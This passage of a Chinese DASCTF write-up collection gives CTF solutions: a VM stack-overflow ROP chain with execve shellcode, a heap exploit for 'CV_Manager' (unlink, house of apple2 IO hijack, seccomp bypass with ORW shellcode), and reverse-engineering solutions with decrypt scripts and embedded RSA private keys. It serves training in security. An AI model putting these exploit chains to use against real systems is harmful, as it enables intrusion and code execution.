85: call func_1:
89: call func_2:
93: call func_3:
97: rst 8h
101: ret 0h
func_2:
105: cst 6h
109: gsp r0
111: mov r1,0h
117: mov r2,18h
123: push r2
125: push r1
127: push r0
129: call func_4:
133: gsp r1
135: mov r0,0h
141: mov r2,50h
147: push r2
149: push r1
151: push r0
153: call func_5:
157: gsp r1
159: push r1
161: call func_6:
165: rst 6h
169: ret 0h
func_3:
173: mov r0,0h
179: scall 3ch
183: ret 0h
func_5:
187: push r5
189: gsp r5
191: add r5,8h
197: ldrd r0,r5
200: add r5,4h
206: ldrd r1,r5
209: add r5,4h
215: ldrd r2,r5
218: scalls 0h
222: pop r5
224: ret 3h
func_9:
228: push r5
230: gsp r5
232: add r5,8h
238: ldrd r0,r5
241: add r5,4h
247: ldrd r1,r5
250: add r5,4h
256: ldrd r2,r5
259: scalls 1h
263: pop r5
265: ret 3h
func_4:
269: push r5
271: gsp r5
273: add r5,8h
279: ldrd r0,r5
282: add r5,4h
288: ldrd r1,r5
291: add r5,4h
297: ldrd r2,r5
300: mov r3,0h
label_0
306: sdrb r0,r1
309: inc r0
311: inc r3
313: cmp r3,r2
316: jl label_0
320: pop r5
322: ret 3h
func_6:
326: push r5
328: gsp r5
330: add r5,8h
336: cst 3h
340: gsp r1
342: mov r0,r1
345: sdrd r0,6c6c6568h
351: add r0,4h
357: sdrw r0,206fh
363: mov r0,1h
369: mov r2,6h
375: push r2
377: push r1
379: push r0
381: call func_7:
385: ldrd r1,r5
388: push r1
390: call func_8:
394: mov r2,r0
397: ldrd r1,r5
400: mov r0,1h
406: push r2
408: push r1
410: push r0
412: call func_9:
416: rst 3h
420: pop r5
422: ret 1h
func_8:
426: push r5
428: gsp r5
430: add r5,8h
436: ldrd r1,r5
439: mov r0,r1
label_2
442: ldrb r2,r0
445: cmp r2,0h
451: je label_1
455: inc r0
457: jmp label_2
label_1
461: sub r0,r1
464: pop r5
466: ret 1h
```

分析反汇编信息发现程序`func_2`中存在栈溢出，这里栈空间为`6`个单位，也就是`6*4`，但允许输入`0x50`个数据，会导致溢出  
由于参数通过栈传输，所以可以构造`rop`链调用`func_5`函数向指令段中写入`shellcode`

编写编译脚本用来编译shellcode

```python
def arg0(arg1,*args):
    data=[]
    if (arg1<0):
        arg1=(-arg1)|0x800000
    return arg1.to_bytes(3,'big')
    pass
def arg1(arg1,*args):
    return arg1.to_bytes(1,'little')
    pass
def arg2(arg1,arg2):
    return arg1.to_bytes(1,'little')+arg2.to_bytes(1,'little')
    pass
def arg3(arg1,arg2):
    return arg1.to_bytes(1,'little')+arg2.to_bytes(4,'little')
    pass

args_handle=[arg0,arg1,arg2,arg3]

def compile(code:str,codes,labels,jmplist):
    if (';' in code):
        code=code[:code.find(';')]
    if (':' in code):
        label=code[:code.find(':')].strip()
        labels[label]=codes[1]
        return b"";
    code=code.strip()
    if (len(code)==0):
        return b"";
    if (code.find(' ')==-1):
        raise Exception(f"[error]: {code}")
    inst=code[:code.find(' ')]
    args=code[code.find(' ')+1:].strip()
    if (',' in args):
        arg1=args[:args.find(',')].strip()
        arg2=args[args.find(',')+1:].strip()
    else:
        arg1=args
        arg2=None

    if (len(arg1)==0):
       raise Exception(f"[error]: {code}")
    if (len(arg1)==2 and arg1[0]=='r' and arg1[1].isdigit()):
        arg1=int(arg1[1:])
        argflag=1
    else:
        try:
            if (arg1[-1]=='h'):
                arg1=int(arg1[:-1],16)
            elif (arg1[-1]=='b'):
                arg1=int(arg1[:-1],2)
            else:
                arg1=int(arg1)
        except:
            pass

        argflag=0
    if (arg2!=None):
        if (len(arg2)==2 and arg2[0]=='r' and arg2[1].isdigit()):
            arg2=int(arg2[1:])
            argflag=2
        else:
            if (arg2[-1]=='h'):
                arg2=int(arg2[:-1],16)
            elif (arg2[-1]=='b'):
                arg2=int(arg2[:-1],2)
            else:
                arg2=int(arg2)
            argflag=3
    
    codes_0=["cmp","cmps","mov","xor","or","and","sal","sar","xchg","add","sub","ldrb","ldrw","ldrd","sdrb","sdrw","sdrd"]
    codes_1=["push","pop","inc","dec","gsp","cst","rst"]
    codes_2=["jmp","je","jg","jl","jge","jle","jne","call"]
    codes_3=["scall","scalld","scalls","scalld","scallds","scalldd","scallsd","scalldsd","ret"]
    if (inst in codes_0):
        args=args_handle[argflag](arg1,arg2)
        inst_code=((codes_0.index(inst)+1)<<2)|argflag
    elif (inst in codes_1):
        args=args_handle[argflag](arg1,arg2)
        inst_code=((codes_1.index(inst)+31)<<2)|argflag
        pass
    elif (inst in codes_2):
        if (type(arg1)!=int):
            jmplist[len(codes[0])]=arg1
            arg1=0;
        args=args_handle[argflag](arg1,arg2)
        inst_code=((codes_2.index(inst)+41)<<2)|argflag
        pass
    elif (inst in codes_3):
        args=args_handle[argflag](arg1,arg2)
        inst_code=((codes_3.index(inst)+51)<<2)|argflag
        pass
    else:
        return b""
    return inst_code.to_bytes(1,'little')+args

def main():
    f=open("code");
    d=f.read().splitlines()
    labels={}
    codes=[[],0]
    jmplist={}
    for i in d:
        code=compile(i,codes,labels,jmplist)
        if (len(code)==0):
            continue
        codes[0].append(code)
        codes[1]+=len(codes[0][-1])
    for i in jmplist:
        inst_code=codes[0][i][:1]
        to=labels[jmplist[i]]
        form=len(b''.join(codes[0][:i+1]))
        args=arg0(to-form)
        codes[0][i]=inst_code+args
        pass
    print(codes)
    print(b''.join(codes[0]))
main();
```



shellcode

```javascript
mov r0,0068732fh
mov r1,6e69622fh
push r0
push r1
gsp r0
mov r1,0
mov r2,0
scalld 59
```

```python
"""
    exp
"""
from pwn import *
import sys
def exp(ip,port):
    p=remote(ip,port)
    shellcode=b'\x0f\x00/sh\x00\x0f\x01/bin}\x00}\x01\x8d\x00\x0f\x01\x00\x00\x00\x00\x0f\x02\x00\x00\x00\x00\xd0\x00\x00;'
    #gdb.attach(p,'b puts\nc')
    payload=p32(0x61616161)*6+p32(187)+p32(468)+p32(0)+p32(468)+p32(0x50)
    p.sendafter("name?",payload)
    pause()
    p.sendline(shellcode)
    p.interactive()
if __name__=='__main__':
    exp(sys.argv[1],sys.argv[2])

```

## 题目-CV_Manager
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| CV_Manager | PWN | 困难 |


### FLAG
+ 动态flag

### 知识点
1. 换表base64
2. unlink
3. IO结构体利用--house of apple2
4. 沙箱绕过

### 解题步骤
#### 步骤一：保护检测与反编译
##### 保护检测
先checksec

<img src="https://c.img.dasctf.com/LightPicture/2024/10/5cad6e1199776109.png" width="772" title="null" crop="0,0,1,1" id="fNXjy" class="ne-image">

再看沙箱，这个就涉及到要先过login函数中的检测，下面先分析login函数

##### login
<img src="https://c.img.dasctf.com/LightPicture/2024/10/980c83dc2527ee78.png" width="898" title="null" crop="0,0,1,1" id="ircMC" class="ne-image">

要求传入username和password，username是r00t直接给了，password进入sub_1633检测

##### sub_1633
<img src="https://c.img.dasctf.com/LightPicture/2024/10/0f6b164a1032487c.png" width="882" title="null" crop="0,0,1,1" id="z9qf7" class="ne-image">

其实里面就是换表的base64，可以找到编码后结果和base64表，解码即可得到password为p9s3w0r6

<img src="https://c.img.dasctf.com/LightPicture/2024/10/a21126088bb38ec0.png" width="1210" title="null" crop="0,0,1,1" id="mMvi7" class="ne-image">

那么下面就可以通过检测看沙箱了

<img src="https://c.img.dasctf.com/LightPicture/2024/11/adf0a42ed8cd03dc.png" width="862" title="null" crop="0,0,1,1" id="SNdpr" class="ne-image">

可以直接得到一条orw链，openat+mmap+writev

##### 反编译
##### sub_1209
<img src="https://c.img.dasctf.com/LightPicture/2024/10/630191c6080b88b9.png" width="605" title="null" crop="0,0,1,1" id="Xe1tw" class="ne-image">

设置缓冲区

##### sub_1978
<img src="https://c.img.dasctf.com/LightPicture/2024/10/2aeeb5368578840d.png" width="784" title="null" crop="0,0,1,1" id="h49zz" class="ne-image">

打印菜单

##### sub_1A14
add操作，最多16个，malloc大小在0x100到0x200之间，同时会在bss段写入最多0x10字节的内容

<img src="https://c.img.dasctf.com/LightPicture/2024/10/369292eb8bad7b9f.png" width="948" title="null" crop="0,0,1,1" id="VBlf1" class="ne-image">

##### sub_1BB8
edit操作根据记录的size大小读入数据

<img src="https://c.img.dasctf.com/LightPicture/2024/10/5910c6d66a41e0d2.png" width="987" title="null" crop="0,0,1,1" id="vUPCQ" class="ne-image">

##### sub_1CB7
delete操作

<img src="https://c.img.dasctf.com/LightPicture/2024/10/521e4ce9de0b93a5.png" width="784" title="null" crop="0,0,1,1" id="xH14S" class="ne-image">

##### sub_1D9
show操作

<img src="https://c.img.dasctf.com/LightPicture/2024/10/5072cd53e3c388cb.png" width="1106" title="null" crop="0,0,1,1" id="wsFEB" class="ne-image">

##### sub_1273
设置沙箱用

##### sub_1EDE
后门，提供了一次UAF的机会，同时匹配字符串成功后还会打印内容

<img src="https://c.img.dasctf.com/LightPicture/2024/10/e694ab6162154e7e.png" width="1209" title="null" crop="0,0,1,1" id="GgK0W" class="ne-image">

##### 恢复结构体
在add中可以看到记录了一个bss段数组地址，一个malloc地址，一个size，那么就能构造出下列结构体

<img src="https://c.img.dasctf.com/LightPicture/2024/10/769c4ef7567e5e47.png" width="593" title="null" crop="0,0,1,1" id="O7J6T" class="ne-image">

bss段数组单个大小为0x10字节，所以同理可以构造一个0x10大小的数组

<img src="https://c.img.dasctf.com/LightPicture/2024/10/0a1778499c871288.png" width="651" title="null" crop="0,0,1,1" id="wymHT" class="ne-image">

接着设置类型可以得到恢复后的内容

<img src="https://c.img.dasctf.com/LightPicture/2024/10/edba5a47b68681e7.png" width="702" title="null" crop="0,0,1,1" id="Pv3nv" class="ne-image">

### 步骤二：泄露PIE地址
重新来看一下后门函数

<img src="https://c.img.dasctf.com/LightPicture/2024/10/9cf5cded71de67b2.png" width="966" title="null" crop="0,0,1,1" id="bBKRM" class="ne-image">

这里会有一次UAF，同时name字段匹配`CCTTFFEERR!!`就能打印Chunks中的第一个元素，其实就是void *name的值，而该值存储的是一个bss段地址，那么就能够通过这里来泄露出PIE地址了

### 步骤三：unlink
既然知道了PIE地址，那么就能够知道Chunks数组的地址，同时还有一次UAF，直接做unlink即可

#### UAF
<img src="https://c.img.dasctf.com/LightPicture/2024/10/7876de56d034801f.png" width="638" title="null" crop="0,0,1,1" id="grBoy" class="ne-image">

通过UAF释放堆块将下一块的prev_inuse为置0

#### edit
利用edit在释放后的堆块上伪造一个堆块，对应fd位置写ptr-0x18，bk位置写ptr-0x10

<img src="https://c.img.dasctf.com/LightPicture/2024/10/b16f62466f48dc3f.png" width="692" title="null" crop="0,0,1,1" id="GLztV" class="ne-image">

#### delete
释放下面一块堆块，向前合并

<img src="https://c.img.dasctf.com/LightPicture/2024/10/b55ebc4b73dbc697.png" width="803" title="null" crop="0,0,1,1" id="TyYMt" class="ne-image">

Chunk[0].ins的位置就写上了Chunk上方的地址

### 步骤四：泄露libc地址
既然现在已经可以控制Chunks数组了，那么只要写上got表地址，再show就可以拿到libc地址

<img src="https://c.img.dasctf.com/LightPicture/2024/10/51121d56ac38a461.png" width="1079" title="null" crop="0,0,1,1" id="vajAt" class="ne-image">

### 步骤五：IO链和bypass seccomp
通过修改Chunks[i].ins指针，再利用edit就能达到任意地址修改的目的，由于这里的libc版本是glibc2.35，所以采取伪造IO结构体的手段来劫持程序执行流，采用house of apple2 + setcontext

<img src="https://c.img.dasctf.com/LightPicture/2024/10/e527b1868e8bf625.png" width="868" title="null" crop="0,0,1,1" id="VeJz1" class="ne-image">

<img src="https://c.img.dasctf.com/LightPicture/2024/10/ad18f7d83800d416.png" width="939" title="null" crop="0,0,1,1" id="fZ9Jc" class="ne-image">

对于沙箱，采用orw绕过，利用openat+mmap+writev

```python
shellcode = shellcraft.amd64.openat(-100,"flag",0)
shellcode += shellcraft.amd64.mmap(0,0x100,1,1,'rax',0)
shellcode += f'''
        mov rbx, 0x30
        sub rsp, 16
        mov [rsp], rax
        mov [rsp + 8], rbx
    '''
shellcode += shellcraft.amd64.writev(1,'rsp',1)
```

### 步骤六：运行EXP获取flag
```python
from pwn import *

context.os = 'linux'
context.arch = "amd64"
context.log_level = "debug"

elf = ELF("./pwn")

def menu(i):
    io.sendlineafter(b"choice:",str(i).encode())

def add(size, name):
    menu(1)
    io.sendlineafter(b"length:",str(size).encode())
    io.sendafter(b"name:", name)
    sleep(0.2)

def edit(idx, msg):
    menu(2)
    io.sendlineafter(b"modify:\n", str(idx).encode())
    io.sendafter(b"yourself:",msg)
    sleep(0.2)

def delete(idx):
    menu(3)
    io.sendlineafter(b"remove:\n", str(idx).encode())
    sleep(0.2)

def show(idx):
    menu(4)
    io.sendlineafter(b"view:\n", str(idx).encode())
    sleep(0.2)

def uaf(idx):
    menu(666)
    io.sendlineafter(b"index:\n", str(idx).encode())
    sleep(0.2)

def exp():
    io.sendlineafter(b"username:",b"r00t")
    io.sendlineafter(b"password:",b"p9s3w0r6")

    for i in range(9):
        add(0x128, b"CCTTFFEERR!!\n") # 0-8

    for i in range(8,1,-1):
        delete(i)

    uaf(0)
    pie = u64(io.recv(8)) - 0x51e0
    print("[+]pie:",hex(pie))
    add(0x188, b"CCTTFFEERR!!\n")
    t = pie + 0x5068
    pl = p64(0) + p64(0x121)
    pl += p64(t-0x18) + p64(t-0x10)
    pl = pl.ljust(0x120,b"\x00")
    pl += p64(0x120)
    edit(0,pl)
    delete(1)

    name = pie + 0x51E0
    pl = p64(0)*2 
    pl += p64(name) + p64(pie + 0x5050) + p64(0x128)
    pl += p64(name) + p64(pie + elf.got['free']) + p64(0x128)
    edit(0, pl)
    show(1)
    io.recvuntil(b"introduction:")
    free = u64(io.recv(8))
    libc = ELF("./libc.so.6")
    libc_base = free - libc.sym['free']
    print("[+]libc_base:",hex(libc_base))
    _IO_list_all = libc_base + libc.sym['_IO_list_all']
    _IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
    rdi_ret = libc_base + 0x000000000002a3e5
    rsi_ret = libc_base + 0x000000000002be51
    rdx_rbx_ret = libc_base + 0x00000000000904a9
    ret = rdi_ret + 1
    setcontext = libc_base + libc.sym['setcontext'] + 61

    pl = p64(0)*2 
    pl += p64(name) + p64(pie + 0x5050) + p64(0x128)
    pl += p64(name) + p64(name) + p64(0x200)
    pl += p64(name) + p64(_IO_list_all) + p64(0x128)
    edit(0, pl)
    fake_addr = name

    sshellcode = shellcraft.amd64.openat(-100,"flag",0)
    shellcode += shellcraft.amd64.mmap(0,0x100,1,1,'rax',0)
    shellcode += f'''
        mov rbx, 0x30
        sub rsp, 16
        mov [rsp], rax
        mov [rsp + 8], rbx
    '''
    shellcode += shellcraft.amd64.writev(1,'rsp',1)

    shellcode = asm(shellcode)

    assert len(shellcode) <= 0xe0-0x40
    data = flat({
        0:{
            0x08:fake_addr-0x10,
            0x10:setcontext,
            0x28:1,
            0x30:[rdi_ret,fake_addr&(~0xfff),rsi_ret,0x4000,rdx_rbx_ret,7,0,libc_base+libc.sym['mprotect'],fake_addr+0x100+0x40],
            0x90:fake_addr + 0x30,
            0x98:ret,
            0xa0:fake_addr + 0x100,
            0xd8:_IO_wfile_jumps
        },
        0x100:{	
            0x18:0,
            0x28:libc_base + 0x167420,
            0x30:0,
            0x40:shellcode,
            0xe0:fake_addr + 0xc0
        }
    },filler='\0')
    edit(1, data)
    edit(2, p64(name))
    g()
    menu(5)


io = process(["./pwn"])
# io = remote("127.0.0.1",9999)
exp()
io.interactive()

```

# REVERSE
## 题目-ezmac
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| ezmac | Reverse | 中等 |


### FLAG
+ DASCTF{83c720da35436cc0}

### 知识点
1. ARM汇编
2. macOS逆向
3. XOR
4. 代码混淆

### 解题步骤
x1解法一：

看汇编指令

首先定位密文

<img src="https://c.img.dasctf.com/LightPicture/2025/04/cf98688432825386.png" width="1494" title="null" crop="0,0,1,1" id="kxxVw" class="ne-image">

可以看到X21寄存器存储了密文的地址，后面W3寄存器读取X21的每一个字节，W3与W5异或，异或完成后W5自增+1

<img src="https://c.img.dasctf.com/LightPicture/2025/04/111f14f82f9a54db.png" width="1682" title="null" crop="0,0,1,1" id="XWnKk" class="ne-image">

前面一堆加法，都是逐个+1，总计增加了57次

<img src="https://c.img.dasctf.com/LightPicture/2025/04/c872ab4d8d3987d7.png" width="1322" title="null" crop="0,0,1,1" id="zhCwG" class="ne-image">

因此，W5寄存器初始值为57

解密脚本如下：

```python
flag = "\x7d\x7b\x68\x7f\x69\x78\x44\x78\x72\x21\x74\x76\x75\x22\x26\x7b\x7c\x7e\x78\x7a\x2e\x2d\x7f\x2d"
n = 0x39
for i in flag:
    a = n ^ ord(i)
    n += 1
    print(chr(a), end="")
```

解法二：

macOS平台下动态调试，在解密完成后或者比较出打断点即可获得flag

<img src="https://c.img.dasctf.com/LightPicture/2025/04/6c0353efcc7e28c6.png" width="1518" title="null" crop="0,0,1,1" id="l2SCo" class="ne-image">

<img src="https://c.img.dasctf.com/LightPicture/2025/04/ee041c6dbc4b74ad.png" width="1170" title="null" crop="0,0,1,1" id="mPBW2" class="ne-image">

最后得到flag

```plain
DASCTF{83c720da35436cc0}
```

## 题目-login
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| login | REVERSE | 困难 |


### FLAG
+ DASCTF{dqmaxfwkm921kr21m;df1m1dqmlk1d12d1}

### 知识点
1. RSA加密，PKCS1随机化填充
2. rc4流加密
3. AES,cbs,128加密
4. 客户端与服务端通信
5. 多线程
6. 文件读取
7. c++逆向

### 解题步骤
1. 在server中可以找到rc4加密的密钥与RSA的相关信息:000000000000C020地址处可以看到rc4加密的密钥在000000000000C2D0地址处可以看到RSA的相关值

```plain
n = 26279577997473302411419667124861059882850741251314559833121019394887957289589905456878061363710979876711325996444264427218771183800924637186479983773795304004651057117194687779225419984055876807522857942959359586324565357095338481984910739429368907267954325127230610600757091528278438146342591200779545379032191115035820249676221624340039331286526114494961754916357269342666909622184991281290857525400240138210183817256879784534960899962307881475355674276690508573945102995652224050372583474345526288588870663285370649349021630938434418734960574441453871949405980558252076178243028714640043912011564117664282028675003
e = 65537
p = 158371587908462258205566959933699821809131782867823220410567764978417937843892138711275702585715048479494762449514706278212836036281416878613691406291495666251200424902347969228637577247607358032356801002846236582353341053959891769114443981581225547080218445653527682695513865960773320279217110887693996589233
q = 165936190604230896398548335464877684271335436023943621567229751309410271280097862354478489684611096782336494198644016395976247265345658179607176455391704433793068844514941150288812442643242688086587201984473055728732129050638663003237387231064421633440114890233008477835086862272594396621696906387706196955691
d = 12968165955525662398897077141943773855094593854435487164243867246599233756869895439647297611015074609804883323740875134785978446827193848191546087175739308011694424717314414759968257549084625232978210587977435169469606572335349408374399282367449000495892043452968575951505023400068493047771374501866287552536431153090696172111744069018389677550643185616243365569364928339731948097091708682166103946550620008376126401671824213819800890134042565572628411536453360082093930346572179274780970192163075163947062928687140545223085805109276725490680807183595104950457699833604112897185235474531716610280848674361454338602993

```

2. 之后在偏移为 000000000000C0A0与000000000000C1A0的地方拿到RSA加密后的两个数据
3. 在000000000000C2A0可以找到ASE加密后的值
4. 之后我们解密RSA即可拿到aes的key与iv，之后aes解密即可拿到flag
5. exp:

```c
n = 26279577997473302411419667124861059882850741251314559833121019394887957289589905456878061363710979876711325996444264427218771183800924637186479983773795304004651057117194687779225419984055876807522857942959359586324565357095338481984910739429368907267954325127230610600757091528278438146342591200779545379032191115035820249676221624340039331286526114494961754916357269342666909622184991281290857525400240138210183817256879784534960899962307881475355674276690508573945102995652224050372583474345526288588870663285370649349021630938434418734960574441453871949405980558252076178243028714640043912011564117664282028675003
e = 65537
p = 158371587908462258205566959933699821809131782867823220410567764978417937843892138711275702585715048479494762449514706278212836036281416878613691406291495666251200424902347969228637577247607358032356801002846236582353341053959891769114443981581225547080218445653527682695513865960773320279217110887693996589233
q = 165936190604230896398548335464877684271335436023943621567229751309410271280097862354478489684611096782336494198644016395976247265345658179607176455391704433793068844514941150288812442643242688086587201984473055728732129050638663003237387231064421633440114890233008477835086862272594396621696906387706196955691
d = 12968165955525662398897077141943773855094593854435487164243867246599233756869895439647297611015074609804883323740875134785978446827193848191546087175739308011694424717314414759968257549084625232978210587977435169469606572335349408374399282367449000495892043452968575951505023400068493047771374501866287552536431153090696172111744069018389677550643185616243365569364928339731948097091708682166103946550620008376126401671824213819800890134042565572628411536453360082093930346572179274780970192163075163947062928687140545223085805109276725490680807183595104950457699833604112897185235474531716610280848674361454338602993
enrsa_key =[129, 245, 187, 63, 232, 67, 121, 236, 7, 197, 142, 157, 53, 69, 205, 8, 103, 195, 145, 115, 52, 54, 85, 116, 165, 201, 161, 28, 123, 46, 145, 108, 19, 52, 194, 183, 40, 152, 123, 62, 131, 79, 21, 240, 198, 145, 196, 183, 64, 32, 212, 60, 141, 253, 244, 166, 249, 122, 197, 135, 51, 208, 240, 119, 153, 12, 73, 151, 25, 89, 11, 92, 133, 197, 3, 61, 201, 45, 138, 214, 103, 31, 158, 15, 120, 175, 127, 57, 5, 84, 146, 22, 162, 111, 155, 164, 27, 14, 118, 174, 16, 21, 226, 21, 21, 222, 242, 175, 218, 164, 106, 218, 89, 233, 49, 38, 140, 96, 194, 71, 248, 55, 129, 160, 161, 7, 85, 21, 209, 8, 18, 9, 90, 125, 69, 30, 213, 159, 96, 2, 41, 31, 84, 18, 228, 204, 227, 77, 142, 206, 127, 156, 10, 72, 187, 32, 186, 76, 124, 20, 141, 35, 231, 102, 21, 113, 170, 106, 111, 156, 210, 215, 46, 132, 255, 156, 80, 184, 137, 219, 121, 84, 155, 249, 128, 49, 8, 7, 252, 123, 51, 175, 128, 172, 194, 13, 131, 156, 97, 6, 84, 128, 16, 124, 211, 174, 111, 87, 239, 22, 238, 76, 184, 90, 58, 124, 204, 100, 92, 79, 225, 82, 86, 248, 152, 127, 159, 212, 131, 49, 164, 69, 83, 129, 193, 210, 35, 95, 100, 201, 100, 202, 205, 77, 69, 247, 204, 68, 221, 226, 4, 151, 191, 171, 234, 226]
enrsa_iv = [89, 189, 0, 111, 104, 172, 207, 124, 143, 216, 120, 79, 148, 80, 91, 147, 53, 116, 228, 7, 132, 206, 182, 201, 40, 57, 177, 5, 217, 53, 249, 171, 208, 30, 133, 243, 55, 44, 196, 92, 87, 123, 205, 109, 133, 138, 21, 135, 56, 130, 86, 136, 99, 143, 6, 249, 141, 196, 185, 95, 146, 50, 0, 90, 148, 102, 76, 49, 213, 10, 47, 167, 226, 192, 229, 219, 158, 92, 226, 40, 16, 127, 210, 53, 79, 13, 7, 245, 198, 129, 99, 57, 71, 192, 5, 163, 221, 15, 172, 242, 155, 245, 106, 194, 250, 97, 202, 189, 214, 125, 116, 133, 121, 185, 23, 175, 114, 83, 203, 139, 27, 10, 216, 14, 217, 207, 215, 92, 146, 173, 244, 32, 231, 183, 192, 252, 142, 225, 15, 194, 158, 203, 91, 142, 238, 94, 249, 95, 216, 202, 243, 72, 21, 242, 180, 129, 88, 40, 52, 33, 23, 93, 220, 239, 204, 164, 12, 111, 222, 253, 6, 176, 93, 19, 130, 79, 25, 184, 14, 251, 183, 158, 226, 252, 111, 144, 107, 103, 228, 28, 135, 81, 124, 57, 26, 48, 75, 254, 244, 104, 5, 137, 79, 193, 213, 175, 136, 216, 135, 143, 53, 145, 50, 115, 255, 49, 126, 78, 16, 46, 179, 255, 76, 46, 240, 79, 206, 59, 106, 125, 168, 78, 217, 166, 242, 121, 194, 225, 223, 49, 1, 148, 132, 66, 200, 98, 218, 202, 163, 187, 213, 174, 95, 248, 176, 125]
enaes_passwd = [149, 91, 57, 136, 37, 213, 74, 48, 167, 29, 92, 252, 27, 160, 226, 124, 89, 77, 219, 196, 13, 213, 79, 192, 216, 2, 240, 71, 168, 247, 43, 131, 39, 84, 229, 157, 121, 249, 194, 69, 158, 243, 216, 13, 63, 109, 28, 239]


import gmpy2
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

def dersa(cip:bytes):
    global n,e,p,q,d
    rsakey = RSA.construct((n, e, d, p, q))
    cipher_rsa = PKCS1_OAEP.new(rsakey)
    decrypted_data = cipher_rsa.decrypt(cip)
    return decrypted_data

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def deaes(key:bytes,iv:bytes,cip:bytes):
    Set_AES = AES.new(key,AES.MODE_CBC,iv)
    m = pad(cip,16,style="pkcs7")
    c = Set_AES.decrypt(m)
    return c



## rc4 加密
from Crypto.Cipher import ARC4 as rc4cipher

def rc4(key:bytes,cip:bytes):
    enc = rc4cipher.new(key)
    res = enc.decrypt(cip)
    return res


iv = dersa(bytes(enrsa_iv))
key = dersa(bytes(enrsa_key))

print(iv)
print(key)
passwd = deaes(key,iv,bytes(enaes_passwd))
print(passwd)


```

得到flag：DASCTF{dqmaxfwkm921kr21m;df1m1dqmlk1d12d1}

6. 需要注意的是RSA采用的是PKCS1随机化填充

## 题目-androidfile
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| androidfile | 逆向 | 中等 |


### FLAG
+ DASCTF{android_encrypto_file_and_plains}

### 知识点
1. JADX静态分析
2. IDA分析so文件
3. DEX文件混淆保护
4. StringFog字符串保护项目
5. AES加密
6. RC4加密
7. Base64加密
8. XOR

### 解题步骤
**步骤1：获取目标程序**

下载并查看题目附件

包含了一个apk和一个txt文本

<img src="https://c.img.dasctf.com/LightPicture/2024/10/ec3cf9d4758f20d3.png" width="756" title="null" crop="0,0,1,1" id="F63dR" class="ne-image">



```plain
EvB2udc3ofALSbCxeH5j4O2QZjfyZ151Nj3tOBVpt+99XXudbbzYknID0CxFcVO5+Vf16SjxzVbCuOizTIm3TVXXprsM1IlyjzJnTIUc8s4cFIX+clb1zN5PqUm11Z9LDlUMGYu+fa0fZqB5o7EMXWJvl+uKOsk/K3zzrnU0Rdpn/Ylm0ZBBDqpaNDYeXkGM52Uj6NxOhRRMaW2VcH/u4rNg7y7/X6OKa68G2TstGohwelnKpzgp4eFBNxn2<-encryptinput->UBUSWb+1P3Z/aokV67e5xQ7eaHoEj3JAeC0XA1RckTWdWZYCB/+D7qC3Hao74goX



获取的RSA公钥和私钥
-----BEGIN PUBLIC KEY-----  
MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJ3AfAR+HoKn8iQaFT8xjSLkJf+uHuX5  dSH/gsLSAlqIkVeADHx7okRAfl5U2sCe0A/2SY9sDurGOLHTYcmHAuECAwEAAQ==  
-----END PUBLIC KEY-----

-----BEGIN PRIVATE KEY-----  
MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAncB8BH4egqfyJBoV
PzGNIuQl/64e5fl1If+CwtICWoiRV4AMfHuiREB+XlTawJ7QD/ZJj2wO6sY4sdNh  yYcC4QIDAQABAkEAh81Gdg+kcFHoD9AsbkRX/atuUtcwXkYL4gK2LMThpdEFHIO7  Scr+SYfwqmm/LMtkbojEGEnNoIfmoLvGfhXaAQIhANDWo8OSMSQFnvh129cFiVfY  KlS4ec24ixvFD8fUD4SRAiEAwWBuZ3kox1n21AsTAxom+E3z5KUUOSUjPXvG6tZB  gVECIDOP2y0tSi6/qIll6BqFxmxG9eSnC4PMfaQkmonXBOHRAiBmJUPsUGmj8/eX  xknCp7vSCYs9SZ3HGcDlp05Jmed8IQIhAJnE1PNe9lC5OazgRYhSG6bGCTbfFHT6
OuwCVIxRSx4P  
-----END PRIVATE KEY-----
```

RSA公钥和私钥可能对我们有帮助





**步骤2：静态分析**

使用反编译工具JADX对目标程序进行静态分析，了解程序的基本结构和逻辑。寻找可能的加密/解密函数。

<img src="https://c.img.dasctf.com/LightPicture/2024/10/27f5352c418bb2f2.png" width="2560" title="null" crop="0,0,1,1" id="bahht" class="ne-image">

<img src="https://c.img.dasctf.com/LightPicture/2024/10/0f1a8ba662ecf4c1.png" width="1875" title="null" crop="0,0,1,1" id="yGJVC" class="ne-image">

我们跟进函数m1640i

<img src="https://c.img.dasctf.com/LightPicture/2024/10/965241352824746e.png" width="1015" title="null" crop="0,0,1,1" id="e5C24" class="ne-image">

手动解密,然后添加注释

<img src="https://c.img.dasctf.com/LightPicture/2024/10/d6cc06c0ab21c45e.png" width="1761" title="null" crop="0,0,1,1" id="f8o5O" class="ne-image">

发现导入了androidfile.so文件

```plain
System.loadLibrary("androidfile");
```

<img src="https://c.img.dasctf.com/LightPicture/2024/10/2159d35ceb5ce731.png" width="2016" title="null" crop="0,0,1,1" id="WqJv4" class="ne-image">

分析a_p,在so文件libandroidfile.so

<img src="https://c.img.dasctf.com/LightPicture/2024/10/84ac353f0efea42d.png" width="1723" title="null" crop="0,0,1,1" id="xQd8V" class="ne-image">

<img src="https://c.img.dasctf.com/LightPicture/2024/10/f9fb1766e1918bde.png" width="1543" title="null" crop="0,0,1,1" id="brnvl" class="ne-image">

<img src="https://c.img.dasctf.com/LightPicture/2024/10/57e40786cf75a642.png" width="1747" title="null" crop="0,0,1,1" id="zRZWT" class="ne-image">

那么题目提供的

```plain
EvB2udc3ofALSbCxeH5j4O2QZjfyZ151Nj3tOBVpt+99XXudbbzYknID0CxFcVO5+Vf16SjxzVbCuOizTIm3TVXXprsM1IlyjzJnTIUc8s4cFIX+clb1zN5PqUm11Z9LDlUMGYu+fa0fZqB5o7EMXWJvl+uKOsk/K3zzrnU0Rdpn/Ylm0ZBBDqpaNDYeXkGM52Uj6NxOhRRMaW2VcH/u4rNg7y7/X6OKa68G2TstGohwelnKpzgp4eFBNxn2
```

就是使用RSA加密后的key和iv了

<img src="https://c.img.dasctf.com/LightPicture/2024/10/3bd41900ccfff05f.png" width="1847" title="null" crop="0,0,1,1" id="NCFxZ" class="ne-image">



**步骤3：定位密文**

密文在程序提供的附件中提供了

```plain
